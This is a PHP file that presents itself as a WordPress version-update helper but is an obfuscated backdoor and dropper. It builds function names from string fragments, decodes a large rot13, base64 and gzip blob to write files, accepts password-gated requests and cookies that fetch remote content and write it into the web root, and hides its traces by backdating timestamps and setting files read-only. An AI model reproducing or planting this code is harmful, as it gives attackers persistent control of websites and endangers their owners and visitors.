<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("tncb{$check}wofmitr", 'f352b3d3171558d8cf8a2cf2047bfbdf')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}